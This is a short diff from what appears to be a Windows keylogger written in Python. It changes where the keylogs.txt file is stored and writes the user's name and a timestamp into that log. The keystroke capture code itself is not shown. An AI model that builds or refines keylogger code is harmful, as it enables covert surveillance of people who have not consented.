@@ -27,7 +27,7 @@ if (argv[0]).endswith('.exe'):
 
 initi = False
 user = os.environ.get("USERNAME")	# Windows username
-log_file = 'keylogs.txt'	# name of log file
+log_file = win_folder + '\\keylogs.txt'	# name of log file
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n")
